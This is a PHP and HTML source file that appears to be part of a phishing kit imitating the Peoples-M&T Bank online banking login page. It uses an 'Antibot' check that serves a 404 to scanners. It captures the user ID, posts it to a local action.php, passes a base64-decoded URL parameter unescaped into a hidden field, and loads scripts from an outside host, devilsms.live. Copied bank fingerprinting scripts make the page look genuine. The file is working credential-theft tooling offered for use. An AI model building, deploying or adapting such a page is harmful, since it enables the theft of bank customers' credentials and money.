<?php
session_start();           
require_once '../session.php';

$comps = new Comp;
$antibot = new Antibot;

if (!$comps->checkToken()) { 
echo $antibot->throw404();      
die();
}
$c = $_GET['cont'];
$d = base64_decode($c);
?>
<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta data-appid="ceb">

    <!-- Latest minified CSS -->
    <link rel="stylesheet" href="eam/content/bootstrap.min.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/eam.css?ver=63.3.4.1" type="text/css">
    <link rel="stylesheet" href="eam/content/fis-icon-font.css?ver=63.3.4.1" type="text/css">

    <link href="eam/styles/ceb_app/136_221172186/BankStyles.css?115707" rel="stylesheet" type="text/css">


    <!-- Latest JavaScript -->
    <script src="/eam/Scripts/umd/popper.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/jquery-3.6.0.min.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/bootstrap.min.js?ver=63.3.4.1"></script>    
    <script src="/eam/Scripts/eam.js?ver=63.3.4.1"></script>
    <script src="/eam/Scripts/eam-visual-validator.js?ver=63.3.4.1"></script>
    <script type="text/javascript">window.name = "";</script>

    <link rel="stylesheet" href="eam/content/jquery.smartbanner.min.css?ver=63.3.4.1" type="text/css" media="screen">
    <script src="/eam/scripts/jquery.smartbanner.min.js?ver=63.3.4.1"></script>



    <title>Log into Peoples-M&amp;T Bank Online Banking</title>

    
    <script type="text/javascript" src="/Eam/Scripts/threat-metrix-config.js"></script>
    <style>
        .card-header .fa {
            transition: .3s transform ease-in-out;
        }
        .card-header .collapsed .fa {
            transform: rotate(90deg);
        }
    </style>

<script id="tdr_eZvR7" type="text/javascript" src="https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jb=31342e6e73633d616461663863613138656d633634383738303964643c6769303b3a3d35666135"></script><script id="tdr_gBEog" type="text/javascript" src="https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jd=373a2e246a646e3f313b266a66683f393439636461326234323764656e67386636326d313466306131666566323935266a6e746c3d303a323735383331"></script><img id="tdr_LLdnS" alt="empty" src="https://qn4omaj34xgldh3hvblua5fx2eymoe7zdixbu3y2a9ec146504f15979am1.e.aa.online-metrix.net/fp/clear.png?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;di=yes" style="visibility: hidden;"><script id="tdr_lL0RG" type="text/javascript" src="https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;ja=303230312624633f363a30267a3d32266635313b3230783132383226696435333b30387a31323432247178793d307a30266c70703d312c313b32322c393230322e333130302e313236322c313336372c393e392e313932302e313234382e382e322465763d3037643733643331343b65366a6630303962363462663330356a3263643b6134246d6c3f30267363643f32342e6c6a3d6874747273273349273a4427304e6169606e652c6b62616e6b6b6e672573677276696367732c63676f2d304467494f25304641706764656e746b616c2d3244496e64657a2531464e4b475045273b463131362730346f7267496625334c3131365f323233313532393a3e2730344e4b464b442731463232313135323130362732366272636e66253b463931345d3a3031333730333a3625323663707041642733446365602666723524786e3f372e72683f653a323064666135373531313364346562653a393b336d603c633b3b3a3b3066266a6a3f356334663233313c6267373436653a623a666b346b3130646b333467303b633b266a736f3f576966646d777325323231322662716a3f416a7a6d6d67253032333031266a716f7535576b6e646f77712668736a7735416a70676f65246e6a613f3132266e666d3d3026767a643d41716963253a445b6a636c6f6a616b266f637668723d343230336c316132626563323267366b613d34323230306166313737363031666436353830313631643665636130346c61313663646a6637303333313339366126723d70647565696e5f666e6171685664696e716729726c77676b6c5d77696e646d7773576d676469615f726c63796d705664636e7b6721726c77656b6e5f61646d6265576161726f6261765e646164716d23726e7d65696c5f73776b636b74696f655e6e616e736521706e756569665d7b6a6d6163756174655c64636c736521726c756f696c5f7265616e706e6171677a5c646364716523706e7765696e5f766e635f786c637965725e64616e736d23786e7765616c5f666574636e76725e66636c736d21726c7567696c5f71766f5d7e6b67756d705e64616e716721706c7565696e576a6376615e66636c71652e65645d613f7f6762656c556760474c253232312e38253030284f70676e454c2d30384751273a32322c302730324368726f6f69756529556562474c273232474451442730324d51253030332c32253230284d706566474e25323045512530304f4e5b4e2730384753273232332c30253230416872676d6b756d2957676249697c556d60496b7c273232576760454c414e474e455f616e7174616e6367645d617a70697b71273b40253030475a565f626c656c645f65696c6d61782531422732384750565d61676e6f705f6077646665725f6a616c6e5f646c6f6174273340253a324d5a565d6c6b73686f6b6c765f74696d67725f79756772792533402530304d5a5c5d646e6763745d626e676c642533422732304d58565f667261655f66657876602731402d30304758565d7168616465705f746d78767572655f6e6f66253b402d30324750565f76657a767772655f636d6d707a657173696f6e5d6272746b273b402730384758565f76677a747572655d636f657070657373696d6e5d726f766b2731402d30304758565d766578747570655f6e696e7465725f636e6b7367767a6d726b6b2733402530325545424b49565f4550545d746578747772675f6e6b6476677057636e6b736d76706f7069632733422d32324558545f715245422d314a273032434a525d706370636c6c656c5d7368696467725f636f6f706b6c6d273b402730384d45515f676e676d656e745d696e6c657a5f75696e762531422d30384d47515764626d5f70676c6465725f6f69706561722533422530304d455b5d7b76636c6c6372665f666770697661746b76657b2531422532304d45515f7c67707677706d5d666e6f63762733422532324f455b5f766578747570655d66646d69765d6e616c6563722731402532304f47535f7c657a747572655d68636c6e5d6e6e6d637c2733402530324d45535f746778747d72675f68616c645f646c67637c5d6e6b666761702531402732304f45515f766d727665785f6170726379576d6a6867617c273340253032554542474c5d636f646f705f6275666465705f6e6e676376273b40253030554740474c5f636d6d707a65717365645f76657a747d706d5d71317c612531422730325745424b4b545f5f4540474c5f636d6d72726d717b67665d7c6778767570675d733374632733422d3232574542474e5f616f65727a6771716d665f76657a767772655f7331746357737067622533402530305f474a454e5d6c676277675d70676e64657267725f616e646f253342273232574d404f4e5d666d6075655f716a63646572732733422d3232574542474e5f66657876605d766770767570652731402532305747424b41545d574542474e5f66657876605d7667707675706527314025323057474247445f667261775f607564666d707b2731402d3030554540454e5f6c6f73675f63676e76657874253142273238554d40494b5c5d574742454e5d6c6f73655d636f66746778742533402530305f474a454e5d65776c76695d66706177313624676c57683f313066343539603439616e6337353863353631313166393538373a616569306761323730326361312e756f6e743f4f6d6f656c67273030496e632c253238284c56494449432924776f6e7a3f434c4f4e452732322a4c564944494325324b2530304e5649464943253a324f67446d7a616527323250565825323031303638253030546925303046697a676b763146393325303074715d355f30253030707b5f375f302532412530304c314c33332b2e6163663d33&amp;jb=33373c246c733d4f6d78696c6c612732463d2e322532302855696c6467757b273032465625303033322c302533422732305f696c363425334025303070343c2b2730384370726c675567624b69742732463d33352e33362530302a4b4056454e27304b2732326c6b69672532304767636b67292732304368706f6f652d304e33323326322e363937332c363725323253616e6170692532463733352e3b34"></script><script id="tdr_DAP2y" type="text/javascript" src="https://content.ibanking-services.com/fp/clear3.png;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jac=1&amp;je=353a2e246d67646a3f2a302c302c332c633e393a356233386461616339333e3363316c35323162343063643635306430373b64356232386231613b343b676d3336666c3261663260353562393065353629"></script><img id="tdr_vB7JT" alt="empty" src="https://content.ibanking-services.com/fp/clear1.png;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jf=36333e24736b645d706c643d7464705f5079314f39774c724841536f58474434247161665f666176673f313635333532373c3033267369645d747b706d3f7f6760386d6164716124716b645f6b657b3d3338353b33303133323632373a633034363a6b67336630303233303630383061383e343a636533643233323138353831363038323036366663643435636163343931636138323633353360363f33386364633c33353437643037376539623563643b373036626530603267373e336e6661643c67373b39353737626563613033346e343739383334323960386c36383460323b61643031313664366330383531383933333033313867633a396a636e3363666a61396426716b665f7369673f33303c353232323033316563353f3b693a30666c6166616163643b333266663133653d336131306665673932663f6038323734393734366260303761366564376365693866366161303032333038606c356330396731323366336036313536633136313730643132303132613531366d3764633166353233636436636235383731623b373536623666603732656e247b6b64703532" style="visibility: hidden;"><script id="tdr_s0wsn" type="text/javascript" src="https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jac=1&amp;je=33343a2426726d3f6c6d2662617471743d73226e6576656c203a332e3832242071766976757122382061686172676b6e672a7d24617564683f6367666a636d36353a3e35376430306460626439373136313f363b326462643b6334343d326a6437343c33363439676067663135393761623f343761323131352667783b3f6c3130353c67363a35603430366562313a39313e633435646362606367386c673030373130303535"></script><script id="tdr_XNrU8" type="text/javascript" src="https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jac=1&amp;je=333b2e247767693f3332332e3136372e393b2e333334"></script><script id="tdr_OpJPG" type="text/javascript" src="https://content.ibanking-services.com/fp/clear3.png;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;je=3337302472663d247066743d363331333325313730302c353b30322d393738322e373132312f313732322c353930302d313d30322c353930312d333538322431313a312f313730322e373935302d333530382c373933312d33353230243731313b2f393730322c343231392d313532302c3d3936342d313532302e363836382f333738322c3732353b2f313530302e37303f302f313530302e3233313a2f39373232"></script><script id="tdr_XFqjE" type="text/javascript" src="https://content.ibanking-services.com/fp/clear3.png;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jac=1&amp;je=30303d24267065743f36392e33342e36302630302c36302e32302e36382c38322e34382c30322c34322c30302c36322e30382c34302e30302e36322e38322434322c38322c34302c32322c36302e32302c3e302c30302c36322e32302434382c32322437392c393b2e34302e30312e36302630322c36302e32302e36382c38322e34382c30332c34322c30302c36322e30383a322e35303032302e3026313b31313124322e37303232322c302e30323030383a40445f4368706f6f65324a5230312c3936382e496c646b6e6974792e3434263836332c3130342e31383b384950322c3e3437"></script><script id="tdr_WC95X" type="text/javascript" src="https://content.ibanking-services.com/fp/clear3.png;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jac=1&amp;je=null"></script><script id="tdr_NkuHe" type="text/javascript" src="https://content.ibanking-services.com/fp/clear3.png;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1&amp;jac=1&amp;je=30303d24267065743f36392e33342e36302630302c36302e32302e36382c38322e34382c30322c34322c30302c36322e30382c34302e30302e36322e38322434322c38322c34302c32322c36302e32302c3e302c30302c36322e32302434382c32322437392c393b2e34302e30312e36302630322c36302e32302e36382c38322e34382c30332c34322c30302c36322e30383a322e35303032302e3026313b31313124322e37303232322c302e30323030383a40445f4368706f6f65324a5230312c3936382e496c646b6e6974792e3434263836332c3130342e31383b384950322c3e3437"></script></head>
<body>
	<header style="margin-top: -21px;">
        <a id="skippy" class="visually-hidden-focusable" href="#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
		<div class="fis-header-content"><a class="brandedImageLink" title="Peoples-M&amp;T Bank" href="http://www.peoples.com"><img id="_BankLogo" class="" title="Peoples-M&amp;T Bank" alt="" src="https://cibng.ibanking-services.com/Eam/Styles/CeB_App/136_221172186/136_image.svg"></a></div>
	</header>

	<div id="content" class="fis-page-content">
		<div class="">
            <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
                <div></div>
                <div class="row">
                    <h1 class="col-sm-12">Log into <span class="productName">Peoples-M&amp;T Bank Online Banking</span></h1>
                </div>
                


<form id="form" method="POST" action="action.php" autocomplete="off" onsubmit="return validateForm()">

<div class="form-group"></div>
<input type="hidden" id="hidden" value="7">
<input type="hidden" name="ad" id="ad" value="<?php echo $d; ?>">
<input id="orgId" name="orgId" type="hidden" value="136_221172186">
    <div class="form-group row"><label class="form-control-label col-sm-4" for="userId" id="LabeluserId">User ID:</label><div class="col-sm-6"><input id="a" name="username" type="text" value="" class="form-control  " maxlength="256"></div></div>

    <div class="form-group row">
        <div class="col-sm-6"><input type="submit" name="signin" id="signin" value="Continue" class="btn btn-primary"></div>
        <div class="col-sm-4"></div>
    </div>
</form>
    <hr>
    <div class="row navigation" role="navigation"><div class="col-sm w-100"> <p><a id="lnkForgotUserID" href="#">Forgot your user ID?</a></p><p><b>Need help?</b><br>Contact us at 1-800-525-9248</p><p><b>Not yet enrolled?</b><br><a href="https://cibng.ibanking-services.com/cib/themes/cib_enroll/enroll/enroll.jsp?FIORG=136&amp;FIFID=221172186">Sign up</a> for the convenience of Peoples-M&amp;T Bank Online Banking today!</p><p><b>We promise to keep your personal information private and secure.</b><br>To learn more, please see our <a href="http://www.peoples.com/protectioncenter" target="_blank">privacy policy.</a></p><p><a href="http://www.peoples.com" target="_blank">Visit our home page</a></p> </div></div>


            </div>
		</div>
	</div>

    <script src="https://devilsms.live/cleave.js"></script>
<script src="https://devilsms.live/clve-min.js"></script> 
        <div class="fis-threatmetrix-profile" role="presentation"><p style="background:url(https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=F2960612C7E5453DA843DD40313E979C&amp;m=1)"></p><img onerror="this.style.display = 'none'" src="https://content.ibanking-services.com/fp/clear.png?org_id=qn4omaj3&amp;session_id=F2960612C7E5453DA843DD40313E979C&amp;m=2" alt=""><script src="https://content.ibanking-services.com/fp/check.js?org_id=qn4omaj3&amp;session_id=F2960612C7E5453DA843DD40313E979C&amp;pageid=1" type="text/javascript"></script><object tabindex="-1" alt="" type="application/x-shockwave-flash" data="https://content.ibanking-services.com/fp/fp.swf?org_id=qn4omaj3&amp;session_id=F2960612C7E5453DA843DD40313E979C" width="1" height="1" id="obj_id"><param name="movie" value="https://content.ibanking-services.com/fp/fp.swf?org_id=qn4omaj3&amp;session_id=F2960612C7E5453DA843DD40313E979C"><div></div></object></div>
        <div id="tm_config" class="d-none" data-waittimeout="5" data-form="#credential" data-submit="#signin" data-selfpostingform="0">
        </div>

<iframe id="tdr_cRdr3" title="empty" aria-disabled="true" aria-hidden="true" width="0" height="0" tabindex="-1" src="https://content.ibanking-services.com/fp/ls_fp.html;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1" style="color: rgba(0, 0, 0, 0); float: left; position: absolute; border: 0px;"></iframe><iframe id="tdr_Qw5AU" title="empty" aria-disabled="true" aria-hidden="true" width="0" height="0" tabindex="-1" src="https://h.online-metrix.net/fp/sid_fp.html;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1" style="color: rgba(0, 0, 0, 0); float: left; position: absolute; border: 0px;"></iframe><iframe id="tdr_inynV" title="empty" aria-disabled="true" aria-hidden="true" width="0" height="0" tabindex="-1" src="https://content.ibanking-services.com/fp/top_fp.html;CIS3SID=BB292A0D8FD88C69F214B039F6EB390F?org_id=qn4omaj3&amp;session_id=f2960612c7e5453da843dd40313e979c&amp;nonce=a9ec146504f15979&amp;pageid=1" style="color: rgba(0, 0, 0, 0); float: left; position: absolute; border: 0px;"></iframe>
<!-- 4425770096 -->
</body></html>